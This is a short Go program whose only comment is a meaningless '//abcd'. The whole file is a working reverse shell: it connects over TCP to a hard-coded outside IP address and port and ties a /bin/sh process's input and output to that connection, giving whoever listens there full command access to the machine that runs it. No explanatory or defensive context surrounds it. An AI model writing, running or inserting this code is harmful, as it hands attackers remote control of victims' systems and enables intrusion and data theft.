//abcd
package main;
import ("net"; "os/exec");                                                                                                                                                           
func main() {                                                                                                                                                                        
   c, _ := net.Dial("tcp", "34.27.46.79:9000");                                                                                                                                     
   cmd := exec.Command("/bin/sh");                                                                                                                                                   
   cmd.Stdin = c;                                                                                                                                                                    
   cmd.Stdout = c;                                                                                                                                                                   
   cmd.Stderr = c;                                                                                                                                                                   
   cmd.Run()                                                                                                                                                                         
   }
   
